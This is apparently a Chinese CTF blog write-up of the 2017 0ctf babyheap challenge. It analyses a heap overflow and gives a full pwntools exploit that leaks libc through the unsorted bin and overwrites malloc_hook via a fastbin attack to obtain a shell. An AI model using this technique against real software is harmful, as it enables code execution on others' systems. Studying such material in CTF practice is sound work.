---
title: 2017-0ctf-babyheap (Arbitrary Alloc)
date: 2018-04-09 21:24:40
categories:
	
tags:
	- CTF
	- Arbitrary-Alloc

---

[TOC]

## 基本信息

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

64位程序，保护全部开启。



## 基本功能

程序是一个堆分配器，主要由以下四种功能

```
  puts("1. Allocate");
  puts("2. Fill");
  puts("3. Free");
  puts("4. Dump");
  puts("5. Exit");
  return printf("Command: ");
```

其中，每次读取命令的函数由读取指定长度的字符串的函数而决定。

通过分配函数

```c
void __fastcall allocate(__int64 a1)
{
  signed int i; // [rsp+10h] [rbp-10h]
  signed int v2; // [rsp+14h] [rbp-Ch]
  void *v3; // [rsp+18h] [rbp-8h]

  for ( i = 0; i <= 15; ++i )
  {
    if ( !*(_DWORD *)(24LL * i + a1) )
    {
      printf("Size: ");
      v2 = read_num();
      if ( v2 > 0 )
      {
        if ( v2 > 4096 )
          v2 = 4096;
        v3 = calloc(v2, 1uLL);
        if ( !v3 )
          exit(-1);
        *(_DWORD *)(24LL * i + a1) = 1;
        *(_QWORD *)(a1 + 24LL * i + 8) = v2;
        *(_QWORD *)(a1 + 24LL * i + 16) = v3;
        printf("Allocate Index %d\n", (unsigned int)i);
      }
      return;
    }
  }
}
```

申请的 chunk 的最大为 4096。此外，我们可以看出每个 chunk 主要有三个字段：是否在使用，堆块大小，堆块位置。故而我们可以创建对应的结构体。

```
00000000 chunk           struc ; (sizeof=0x18, mappedto_6)
00000000 inuse           dq ?
00000008 size            dq ?
00000010 ptr             dq ?
00000018 chunk           ends
```

**需要注意的是堆块是由 calloc 分配的，所以 chunk 中的内容全都为\x00。**

在填充内容的功能中，使用读取内容的函数是直接读取指定长度的内容，并没有设置字符串结尾。**而且比较有意思的是，这个指定长度是我们指定的，并不是之前 chunk 分配时指定的长度，所以这里就出现了任意堆溢出的情形。**

```c
__int64 __fastcall fill(chunk *a1)
{
  __int64 result; // rax
  int v2; // [rsp+18h] [rbp-8h]
  int v3; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = read_num();
  v2 = result;
  if ( (signed int)result >= 0 && (signed int)result <= 15 )
  {
    result = LODWORD(a1[(signed int)result].inuse);
    if ( (_DWORD)result == 1 )
    {
      printf("Size: ");
      result = read_num();
      v3 = result;
      if ( (signed int)result > 0 )
      {
        printf("Content: ");
        result = read_content((char *)a1[v2].ptr, v3);
      }
    }
  }
  return result;
}
```

在释放chunk的功能中该设置的都设置了。

```c
__int64 __fastcall free_chunk(chunk *a1)
{
  __int64 result; // rax
  int v2; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = read_num();
  v2 = result;
  if ( (signed int)result >= 0 && (signed int)result <= 15 )
  {
    result = LODWORD(a1[(signed int)result].inuse);
    if ( (_DWORD)result == 1 )
    {
      LODWORD(a1[v2].inuse) = 0;
      a1[v2].size = 0LL;
      free(a1[v2].ptr);
      result = (__int64)&a1[v2];
      *(_QWORD *)(result + 16) = 0LL;
    }
  }
  return result;
}
```

dump 就是输出对应索引 chunk 的内容。



## 利用思路

可以确定的是，我们主要有的漏洞就是任意长度堆溢出。由于该程序几乎所有保护都开启了，所以我们必须要有一些泄漏才可以控制程序的流程。基本利用思路如下

- 利用 unsorted bin 地址泄漏 libc 基地址。
- 利用 fastbin attack 将chunk 分配到 malloc_hook 附近。

### 泄漏 libc 基地址

由于我们是希望使用 unsorted bin 来泄漏 libc 基地址，所以必须要有 chunk 可以被链接到 unsorted bin 中，所以该 chunk 不能使 fastbin chunk，也不能和 top chunk 相邻。因为前者会被添加到 fastbin 中，后者在不是fastbin 的情况下，会被合并到 top chunk 中。因此，我们这里构造一个 small bin chunk。在将该 chunk 释放到 unsorted bin 的同时，也需要让另外一个正在使用的 chunk 可以同时指向该 chunk 的位置。这样才可以进行泄漏。具体设计如下

```python
    # 1. leak libc base
    allocate(0x10)  # idx 0, 0x00
    allocate(0x10)  # idx 1, 0x20
    allocate(0x10)  # idx 2, 0x40
    allocate(0x10)  # idx 3, 0x60
    allocate(0x80)  # idx 4, 0x80
    # free idx 1, 2, fastbin[0]->idx1->idx2->NULL
    free(2)
    free(1)
```

首先，我们申请了 5 个chunk，并释放了两个chunk，此时堆的情况如下。

```
pwndbg> x/20gx 0x55a03ca22000
0x55a03ca22000: 0x0000000000000000  0x0000000000000021 idx 0
0x55a03ca22010: 0x0000000000000000  0x0000000000000000
0x55a03ca22020: 0x0000000000000000  0x0000000000000021 idx 1
0x55a03ca22030: 0x000055a03ca22040  0x0000000000000000
0x55a03ca22040: 0x0000000000000000  0x0000000000000021 idx 2
0x55a03ca22050: 0x0000000000000000  0x0000000000000000
0x55a03ca22060: 0x0000000000000000  0x0000000000000021 idx 3
0x55a03ca22070: 0x0000000000000000  0x0000000000000000
0x55a03ca22080: 0x0000000000000000  0x0000000000000091 idx 4
0x55a03ca22090: 0x0000000000000000  0x0000000000000000
pwndbg> fastbins 
fastbins
0x20: 0x55a03ca22020 —▸ 0x55a03ca22040 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```

当我们编辑 idx0 后，确实已经将其指向idx4了。这里之所以可以成功是因为堆的始终是 4KB 对齐的，所以idx 4的起始地址的第一个字节必然是0x80。

```python
    # edit idx 0 chunk to particial overwrite idx1's fd to point to idx4
    payload = 0x10 * 'a' + p64(0) + p64(0x21) + p8(0x80)
    fill(0, len(payload), payload)
```

修改成功后如下

```c
pwndbg> x/20gx 0x55a03ca22000
0x55a03ca22000: 0x0000000000000000  0x0000000000000021
0x55a03ca22010: 0x6161616161616161  0x6161616161616161
0x55a03ca22020: 0x0000000000000000  0x0000000000000021
0x55a03ca22030: 0x000055a03ca22080  0x0000000000000000
0x55a03ca22040: 0x0000000000000000  0x0000000000000021
0x55a03ca22050: 0x0000000000000000  0x0000000000000000
0x55a03ca22060: 0x0000000000000000  0x0000000000000021
0x55a03ca22070: 0x0000000000000000  0x0000000000000000
0x55a03ca22080: 0x0000000000000000  0x0000000000000091
0x55a03ca22090: 0x0000000000000000  0x0000000000000000
pwndbg> fastbins 
fastbins
0x20: 0x55a03ca22020 —▸ 0x55a03ca22080 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```

那么，当我们再次申请两个时，第二个申请到的就是idx 4处的chunk。为了能够申请成功，我们需要确保 idx4 的size 与当前 fastbin 的大小一致，所以，我们得修改它的大小。申请成功后，idx2会指向idx4。

```python
    # if we want to allocate at idx4, we must set it's size as 0x21
    payload = 0x10 * 'a' + p64(0) + p64(0x21)
    fill(3, len(payload), payload)
    allocate(0x10)  # idx 1
    allocate(0x10)  # idx 2, which point to idx4's location
```

之后，如果我们想要将 idx 4 放到 unsorted bin 中的话，为了防止其与top chunk 合并，我们需要再次申请一个chunk。此后再释放 idx4 就会进入 unsorted bin中去了。此时由于 idx2 也指向这个地址，所以我们直接展示他的内容就可以得到unsorted bin的地址了。

```python
    # if want to free idx4 to unsorted bin, we must fix its size
    payload = 0x10 * 'a' + p64(0) + p64(0x91)
    fill(3, len(payload), payload)
    # allocate a chunk in order when free idx4, idx 4 not consolidate with top chunk
    allocate(0x80)  # idx 5
    free(4)
    # as idx 2 point to idx4, just show this
    dump(2)
    p.recvuntil('Content: \n')
    unsortedbin_addr = u64(p.recv(8))
    main_arena = unsortedbin_addr - offset_unsortedbin_main_arena
    log.success('main arena addr: ' + hex(main_arena))
    main_arena_offset = 0x3c4b20
    libc_base = main_arena - main_arena_offset
    log.success('libc base addr: ' + hex(libc_base))
```

### 分配chunk到malloc_hook附近

**malloc_hook 是一个 libc 上的函数指针，调用 malloc 时如果该指针不为空则执行它指向的函数，可以通过malloc_hook 来 getshell**

由于 malloc hook 附近的 chunk 大小为 0x7f，所以数据区域为0x60。这里我们再次申请的时候，对应 fastbin 链表中没有相应大小chunk，所以根据堆分配器规则，它会依次处理unsorted bin中的chunk，将其放入到对应的bin中，之后会再次尝试分配 chunk，因为之前释放的 chunk 比当前申请的 chunk 大，所以可以从其前面分割出来一块。所以 idx2 仍然指向该位置，那么我们可以使用类似的办法先释放申请到的chunk，然后再次修改 fd 指针为 fake chunk 即可。此后我们修改 malloc_hook 处的指针即可得到触发 onegadget。

[one_gadget](https://github.com/david942j/one_gadget) 插件可以直接找到` execve('/bin/sh', NULL, NULL)` 

![img-1](2017-0ctf-babyheap/img-1.png)

```python
# 2. malloc to malloc_hook nearby
# allocate a 0x70 size chunk same with malloc hook nearby chunk, idx4
allocate(0x60)
free(4)
# edit idx4's fd point to fake chunk
fake_chunk_addr = main_arena - 0x33
fake_chunk = p64(fake_chunk_addr)
fill(2, len(fake_chunk), fake_chunk)

allocate(0x60)  # idx 4
allocate(0x60)  # idx 6

one_gadget_addr = libc_base + 0x4526a
payload = 0x13 * 'a' + p64(one_gadget_addr)
fill(6, len(payload), payload)
# trigger malloc_hook
allocate(0x100)
p.interactive() 
```

同时，这里的 onegadget 地址也可能需要尝试多次。



## 完整EXP



```python
#coding=utf8
from pwn import *
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
context.binary = "./babyheap"
babyheap = context.binary
if args['REMOTE']:
    p = remote('127.0.0.1', 7777)
else:
    p = process("./babyheap")
log.info('PID: ' + str(proc.pidof(p)[0]))

def offset_bin_main_arena(idx):
    word_bytes = context.word_size / 8
    offset = 4  # lock
    offset += 4  # flags
    offset += word_bytes * 10  # offset fastbin
    offset += word_bytes * 2  # top,last_remainder
    offset += idx * 2 * word_bytes  # idx
    offset -= word_bytes * 2  # bin overlap
    return offset
offset_unsortedbin_main_arena = offset_bin_main_arena(0)
def allocate(size):
    p.recvuntil('Command: ')
    p.sendline('1')
    p.recvuntil('Size: ')
    p.sendline(str(size))
def fill(idx, size, content):
    p.recvuntil('Command: ')
    p.sendline('2')
    p.recvuntil('Index: ')
    p.sendline(str(idx))
    p.recvuntil('Size: ')
    p.sendline(str(size))
    p.recvuntil('Content: ')
    p.send(content)
def free(idx):
    p.recvuntil('Command: ')
    p.sendline('3')
    p.recvuntil('Index: ')
    p.sendline(str(idx))
def dump(idx):
    p.recvuntil('Command: ')
    p.sendline('4')
    p.recvuntil('Index: ')
    p.sendline(str(idx))
def exp():
    # 1. leak libc base
    allocate(0x10)  # idx 0, 0x00
    allocate(0x10)  # idx 1, 0x20
    allocate(0x10)  # idx 2, 0x40
    allocate(0x10)  # idx 3, 0x60
    allocate(0x80)  # idx 4, 0x80
    # free idx 1, 2, fastbin[0]->idx1->idx2->NULL
    free(2)
    free(1)
    # edit idx 0 chunk to particial overwrite idx1's fd to point to idx4
    payload = 0x10 * 'a' + p64(0) + p64(0x21) + p8(0x80)
    fill(0, len(payload), payload)
    # if we want to allocate at idx4, we must set it's size as 0x21
    payload = 0x10 * 'a' + p64(0) + p64(0x21)
    fill(3, len(payload), payload)
    allocate(0x10)  # idx 1
    allocate(0x10)  # idx 2, which point to idx4's location
    # if want to free idx4 to unsorted bin, we must fix its size
    payload = 0x10 * 'a' + p64(0) + p64(0x91)
    fill(3, len(payload), payload)
    # allocate a chunk in order when free idx4, idx 4 not consolidate with top chunk
    allocate(0x80)  # idx 5
    free(4)

    # as idx 2 point to idx4, just show this
    dump(2)
    p.recvuntil('Content: \n')
    unsortedbin_addr = u64(p.recv(8))
    main_arena = unsortedbin_addr - offset_unsortedbin_main_arena
    log.success('main arena addr: ' + hex(main_arena))
    #调试得到main_arena_offset
    # vmmap 查看 第一个 .os 的其实地址 为 libc_base
    # main_arena - libc_base = main_arena_offset
    main_arena_offset = 0x3c4b20  
    libc_base = main_arena - main_arena_offset
    log.success('libc base addr: ' + hex(libc_base))

    # 2. malloc to malloc_hook nearby
    # allocate a 0x70 size chunk same with malloc hook nearby chunk, idx4
    allocate(0x60)
    free(4)
    # edit idx4's fd point to fake chunk
    fake_chunk_addr = main_arena - 0x33 # 错位
    log.success('fake_chunk_addr: '+hex(fake_chunk_addr))
    fake_chunk = p64(fake_chunk_addr)
    fill(2, len(fake_chunk), fake_chunk)
    allocate(0x60)  # idx 4
    allocate(0x60)  # idx 6

    one_gadget_addr = libc_base + 0x4526a # one_gadget
    log.success("one_gadget_addr = "+hex(one_gadget_addr))
    payload = 0x13 * 'a' + p64(one_gadget_addr)  # 0x13  见下图
    fill(6, len(payload), payload)
    # trigger malloc_hook   
    allocate(0x50)
    
    p.interactive()

if __name__ == "__main__":
    exp()

```



0x13 成功

![img-2](2017-0ctf-babyheap/img-2.png)



0xB 不成功

![img-3](2017-0ctf-babyheap/img-3.png)



0x1B 不成功

![img-4](2017-0ctf-babyheap/img-4.png)



## 疑问

1. 不清楚 EXP 中 offset_bin_main_arena() 函数 是啥原理。
2. malloc_hook 有地方不能执行 。(上图)



## 参考

[2017 0ctf babyheap](https://ctf-wiki.github.io/ctf-wiki/pwn/heap/fastbin_attack/#2017-0ctf-babyheap)

[0ctf Quals 2017 - BabyHeap2017](http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html)

[看雪[分享]0ctf2017 - babyheap](https://bbs.pediy.com/thread-223461.htm)

